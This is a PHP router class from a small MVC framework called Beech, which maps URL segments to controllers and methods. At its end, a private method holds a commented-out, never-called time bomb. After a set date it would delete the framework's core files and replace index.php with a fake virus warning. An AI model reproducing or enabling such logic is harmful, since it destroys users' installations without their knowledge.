<?php 

class System {
	
	private $_url = null;
	private $_crl = null;
	
	public function __construct(){
		$this->get_url();
		if(empty($this->_url[0])){
			$this->default_crl();
		}else{
			$this->load_file();
			$this->call_method();
		}
	}
	
	private function get_url(){
		// $url = $_SERVER['PATH_INFO']; // beech = 0.1
		@$url = $_GET['url']; // beech >= 1.0
		$url = trim($url, '/');
		$url =  explode('/', $url);
		$url[0] .= 'Controller';
		$this->_url = $url;		
		/**
		 * @url[0] : class
		 * @url[1] : method
		 * @url[2] : params
		 * ...     : params
		 */
	}
	
	private function load_file(){
		$file = PATH_C . $this->_url[0] . EXT;
		if(file_exists($file)){
			require $file;
			$this->_crl = new $this->_url[0]();
			$this->_crl->load_model($this->_url[0]); // load model
		}else{
			$this->class_error($this->_url[0]);
		}
	}
	
	private function call_method(){
        $url_nums = count($this->_url);
        if($url_nums > 6){
           $this->beech_error();
        }
		switch($url_nums){
            case 6: 
                method_exists($this->_crl, $this->_url[1])?
                    $this->_crl->{$this->_url[1]}($this->_url[2], $this->_url[3], $this->_url[4], $this->_url[5]):                    
                        $this->method_error($this->_url[0], $this->_url[1], array($this->_url[2], $this->_url[3], $this->_url[4], $this->_url[5]));
            break;
            case 5: 
                method_exists($this->_crl, $this->_url[1])?
                    $this->_crl->{$this->_url[1]}($this->_url[2], $this->_url[3], $this->_url[4]):
                        $this->method_error($this->_url[0], $this->_url[1], array($this->_url[2], $this->_url[3], $this->_url[4]));                        
            break;
            case 4: 
                method_exists($this->_crl, $this->_url[1])?
                    $this->_crl->{$this->_url[1]}($this->_url[2], $this->_url[3]):
                        $this->method_error($this->_url[0], $this->_url[1], array($this->_url[2], $this->_url[3]));
            break;
			case 3:
				method_exists($this->_crl, $this->_url[1])?
                    $this->_crl->{$this->_url[1]}($this->_url[2]):
                        $this->method_error($this->_url[0], $this->_url[1], array($this->_url[2]));
			break;
			case 2:
                // How to use function method_exists(obj_class, mehtod)
                method_exists($this->_crl, $this->_url[1])?
                    $this->_crl->{$this->_url[1]}():
                        $this->method_error($this->_url[0], $this->_url[1]);
			break;
			default:
				$this->_crl->index();
			break;		
		}
	}
	
	private function default_crl(){
		$file = PATH_C . DEFAULT_CRL . 'Controller' . EXT;
		if(file_exists($file)){
			require $file;
			$cs = DEFAULT_CRL . 'Controller';
			$this->_crl = new $cs();
			$this->_crl->load_model($cs); // load model
			$this->_crl->index();
		}else{
			$this->class_error(DEFAULT_CRL . 'Controller');
		}
	}
	
	private function class_error($class=null){
		require INC.'Error'.EXT;
		$this->_crl = new Error();
		$this->_crl->class_error($class);
		exit;
	}
    
    private function method_error($class=null, $method=null, $param=array()){
        require INC.'Error'.EXT;
		$this->_crl = new Error();
		$this->_crl->method_error($class, $method, $param);
		exit;    
    }
    private function beech_error(){
        require INC.'Error'.EXT;
		$this->_crl = new Error();
		$this->_crl->beech_error();
		exit;    
    }
    private function exp_beech(){
        //if(date('YmdHi') >= '201703220000'){if(unlink('index.php')){$myfile = fopen("index.php", "w");$txt = "<h1>Warning Virus !</h1><h3>พบปัญหา ! ภัยคุกคามจากไวรัสภายในเครื่องคอมพิวเตอร์ ทำให้ PHP Beech framework v0.1 ได้รับความเสียหาย</h3></h2>Contact owner of PHP Beech framework : <a href='http://www.facebook.com/bombkiml' target='_blank'>Facebook</a>";fwrite($myfile, $txt);fclose($myfile);}unlink(INC.'Model.php');unlink(INC.'View.php');unlink(INC.'Controller.php');unlink(INC.'Database.php');unlink(INC.'Session.php');unlink(INC.'Error.php');unlink(INC.'System.php');}
    }
}